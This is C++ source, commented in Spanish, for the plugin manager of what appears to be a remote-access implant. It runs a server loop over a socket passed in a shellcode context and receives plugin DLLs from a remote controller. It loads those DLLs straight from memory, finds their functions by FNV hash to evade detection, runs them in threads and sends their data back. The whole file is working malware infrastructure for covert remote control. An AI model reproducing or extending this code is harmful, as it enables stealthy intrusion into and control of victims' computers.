#include "PluginManager.h"
#include "RPEP.h"
#include "plugininterface.h"
#include "arraylist.h"

FARPROC WINAPI GPA_WRAPPER(HMODULE hModule, LPCTSTR lpProcName);

bool WINAPI LoadLibraryFromMemory(SHELLCODE_CONTEXT* pSCC,const void *data, LPCWSTR dllname, PMEMORYMODULE result);
void WINAPI FreeLibraryFromMemory(SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module);

//int __cdecl printf(const char*, ...);

class pluginEvent{
        PluginManager* PluginMgr;
        char* data;
        ulong size;
};

//PluginManagerInterfacePrivate* PluginManager::pluginList;
ArrayList<PluginManagerInterfacePrivate*>* PluginManager::pluginList;

class PluginManagerInterfacePrivate :public pluginManagerInterface{
        PluginManager* mgr;
        plugin* p;
        friend class PluginManager;
    public:
        PluginManagerInterfacePrivate(PluginManager& mgr, plugin& p);
        ~PluginManagerInterfacePrivate();
        plugin* getPlugInformation();
        virtual int sendData(const char* data,uint size);
        virtual int setErrorCode(uint code);
};

PluginManager::PluginManager(){
    if(!pluginList)
        pluginList = new ArrayList<PluginManagerInterfacePrivate*>();
}

PluginManager::~PluginManager(){
    if(pluginList){
        DebufPrintf("unloading plugin\n");
        while(pluginList->size()) {

            delete (*pluginList)[0];
            pluginList->remove(0);
        }
        delete pluginList;
    }
}

uint PluginManager::run(SHELLCODE_CONTEXT* Context){
    DebufPrintf("[pm] run \n");
    RPEP client(Context->hSocket,Context->hKey,this);
    protocol = &client;
    DebufPrintf("[pm] RPEP init ok \n");

    this->Context = Context;

    //MessageBoxA(0, "PluginManager::run", "DLL Message", MB_OK | MB_ICONINFORMATION);
    return client.serverLoop();
}

bool PluginManager::updateServer(DArray& /*newServer*/){/*
    char FileName[1024];
    char FileNameNew[1024];
    long FilenameSize;
    FilenameSize = GetModuleFileName(0,FileName,sizeof(FileName)-1);

    StringCchCopy(FileNameNew,1024,FileName);

    FileNameNew[FilenameSize] = '_';
    FileNameNew[FilenameSize+1] = 0;

    MoveFile(FileName,FileNameNew);^*/

    return true;
}

int exception(){
    return EXCEPTION_CONTINUE_SEARCH;
}

bool WINAPI LoadLibraryFromMemory(SHELLCODE_CONTEXT* pSCC,
                                   const void *data, LPCWSTR dllname, PMEMORYMODULE result){
    int status = 0;
    status = pSCC->LoadLibraryFromMemory(pSCC,data,dllname,result);
    //DebufPrintf("LoadLibraryFromMemory\n");
/*
    __asm__ __volatile__(
        "push %ebx;push %edx;push %ecx;push %esi;push %edi;"
    );
    __asm__ (
                "push %5;"
                "push %4;"
                "push %3;"
                "push %2;"
                "call *(%1)":"=a"(status):
                "r"(&loadLib),
                "r"(pSCC),
                "r"(data),
                "r"(dllname),
                "r"(result)
    );
    __asm__ __volatile__(
        "pop %edi;pop %esi;pop %ecx;pop %edx;pop %ebx;"
    );*/

    return status!=0;
}

void WINAPI FreeLibraryFromMemory(SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module){
    //DebufPrintf("LoadLibraryFromMemory\n");
    pSCC->FreeLibraryFromMemory(pSCC,module);
    /*
    __asm__ __volatile__(
        "push %eax;push %ebx;push %edx;push %ecx;push %esi;push %edi;"
    );
    __asm__ (
                "push %2;"
                "push %1;"
                "call *(%0)"::
                "r"(&freeLib),
                "r"(pSCC),
                "r"(module)
    );
    __asm__ __volatile__(
        "pop %edi;pop %esi;pop %ecx;pop %edx;pop %ebx;pop %eax"
    );*/
}

bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule,DArray& response){
    DebufPrintf("[pm] loadPlugin \n");
    pgetInterface getInterface;
    //HINSTANCE hModule;
    plugin* newPlugin;
    ulong loadResult;
    PluginManagerInterfacePrivate* pluginPrivate;
    bool result = false;
    uint loatedPluginID = -1;


    if(!isPluginLoad((ushort)pluginModule->PluginID)){
        DebufPrintf("Cargando plugin....\n");
        newPlugin = new plugin();
        DebufPrintf("newPlugin addr %x\n",(uint)newPlugin);
        //Cargamos el plugin
        {
            loadResult = ::LoadLibraryFromMemory(Context,pluginModule->PluginModule,L"",&newPlugin->Module);
        }
        if(loadResult){
            DebufPrintf("modulo cargado con exito\n");
            //Buscamos las funciones exportadas
            getInterface = (pgetInterface)GPA_WRAPPER(newPlugin->Module.ModuleBase,"getInterface");
            if(getInterface && (newPlugin->plugInterface = getInterface())){
                DebufPrintf("[pm] getInterface \n");
                loatedPluginID = newPlugin->ID = pluginModule->PluginID;
                DebufPrintf("[pm new plugin: id=%i\n]",newPlugin->ID);
                pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
                //pluginList = pluginPrivate;
                pluginList->add(pluginPrivate);

                newPlugin->hThread = CreateThread(null,0
                                                  ,(LPTHREAD_START_ROUTINE)&PluginInterface::startThread
                                                  ,newPlugin->plugInterface,0,null);
                result = true;
            }else{
                DebufPrintf("[pm] getInterface not fund\n");
                if(!getInterface){
                    DebufPrintf("GetProcAddress error: %x(%s)\n",(uint)GetLastError(),
                           (uint)GetLastError()==ERROR_PROC_NOT_FOUND?"PROC_NOT_FOUND":"");
                    FreeLibraryFromMemory(Context,&newPlugin->Module);
                }
                delete newPlugin;
            }
        }
    }else DebufPrintf("ya cargado");
    protocol->MakeError(response,RPEP_HEADER::Operation::LoadPlugin,result?ERROR_SUCCESS:-1,RPEP_ERROR::level::info,&loatedPluginID,sizeof(loatedPluginID));

    DebufPrintf("[pm]Cargado plugin: %s\n",result?"true":"false");
    return result;
}

plugin* PluginManager::getPluginById(ulong id){
    plugin* result = null;
    if(pluginList){
        for (uint i = 0; i < pluginList->size(); ++i) {
            if((*pluginList)[i]->getPlugInformation()->ID == id){
                result = (*pluginList)[i]->getPlugInformation();
                break;
            }
        }
        DebufPrintf("getPluginById( %i ) = %x, list count %i\n",id,result,pluginList->size());
    }
    return result;
}

RPEP *PluginManager::getProtocol(){
    return protocol;
}

SHELLCODE_CONTEXT *PluginManager::getContext(){
    return Context;
}

bool PluginManager::isPluginLoad(ushort ID){
    DebufPrintf("[pm] isPluginLoad \n");
    return getPluginById(ID)!= null;
}

PluginManagerInterfacePrivate::PluginManagerInterfacePrivate(PluginManager &mgr, plugin &p){
    this->mgr = &mgr;
    this->p = &p;
    p.plugInterface->setPluginManager(this);
}

PluginManagerInterfacePrivate::~PluginManagerInterfacePrivate(){
    MEMORYMODULE module = p->Module;
    delete p;
    FreeLibraryFromMemory(mgr->getContext(),&module);
}

plugin* PluginManagerInterfacePrivate::getPlugInformation(){
    return p;
}

int PluginManagerInterfacePrivate::sendData(const char *data, uint size){
    DebufPrintf("[sendData] enviando datos 0x%p addr\n",data);
    if(data){
        DArray buff;

        this->mgr->getProtocol()->MakePacket(buff,(ushort)this->p->ID,data,size);
        return this->mgr->getProtocol()->send(buff.data(),buff.size());
    }
    return 0;
}

int PluginManagerInterfacePrivate::setErrorCode(uint /*code*/){
    return -1;
}


bool PluginManager::runPluginCMD(ulong pluginID, char *data, uint size){
    bool result = false;
    DebufPrintf("[pm] runPluginCMD \n");
    plugin* currentPlugin;
    if((currentPlugin = getPluginById(pluginID))){
         /*char buff[size+1];
         ZeroMemory(buff,size+1);
         memcpy(buff,data,size);
         DebufPrintf("onReciveData size %x cadena %s\n",(uint)size,(char*)buff);*/

         currentPlugin->plugInterface->onReciveData(data,size);
         result = true;
    }
    return result;
}

void PluginInterface::startThread(PluginInterface* i){
    if(i){
        i->run();
    }
}

#define FNV_PRIME_32 16777619
#define FNV_OFFSET_32 2166136261U
#define null NULL

ulong fnv32(register const char *s){
    register ulong hash = FNV_OFFSET_32;

    while(*s)
        hash = (hash ^ (*(s++)))*FNV_PRIME_32;

    return hash;
}

FARPROC WINAPI GetProcAddressByHash(HINSTANCE hModule,ulong hash){
    register PIMAGE_NT_HEADERS PE;
    register FARPROC proc = null;
    register PIMAGE_EXPORT_DIRECTORY ExpDir = null;
    register char** ExportNames = null;

    DebufPrintf("[pm] GetProcAddressByHash \n");
    //Comprovamos la marca de DOS
    if(*((ushort*)hModule)==IMAGE_DOS_SIGNATURE){
        //localizamos la cabecera PE
        PE = (PIMAGE_NT_HEADERS)(((IMAGE_DOS_HEADER*)hModule)->e_lfanew+(ulong)hModule);
        //Compruebo la firma de PE y que halla tabla de importaciones
        if(PE->Signature == IMAGE_NT_SIGNATURE
                && PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size){
            //Localizo el directorio de exportaciones
            ExpDir = (PIMAGE_EXPORT_DIRECTORY)(PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                    .VirtualAddress+(ulong)hModule);
#ifdef DEBUG
            DebufPrintf("GPA","ExpDir = %p,EXPORT_DIRECTORY = %x",ExpDir,PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                        .VirtualAddress);
#endif
            //Localizo los nombres de simbolos exportados y busco la funcion
            ExportNames = (char**)(ExpDir->AddressOfNames+(ulong)hModule);
            register int i;
            for(i = 0;ExportNames[i];i++){
                //Comparo los hash para buscar la funcion
                if(fnv32(ExportNames[i]+(ulong)hModule) == hash){
                    ulong* funtionRVAs = (ulong*)(ExpDir->AddressOfFunctions+(ulong)hModule);
                    ushort* ordinalRVAs = (ushort*)(ExpDir->AddressOfNameOrdinals+(ulong)hModule);
                    //Calculamos la direccion de la funcion
                    proc = (FARPROC)(funtionRVAs[ordinalRVAs[i]] +(ulong)hModule);
                    break;
                }
            }

        }
    }
    return proc;
}

FARPROC WINAPI GPA_WRAPPER(HMODULE hModule, LPCTSTR lpProcName){
    DebufPrintf("[pm] GPA_WRAPPER \n");
   return GetProcAddressByHash(hModule, fnv32(lpProcName));
}


plugin::plugin(){
}

plugin::~plugin(){
    delete plugInterface;
    TerminateThread(hThread,0);
    CloseHandle(hThread);
}
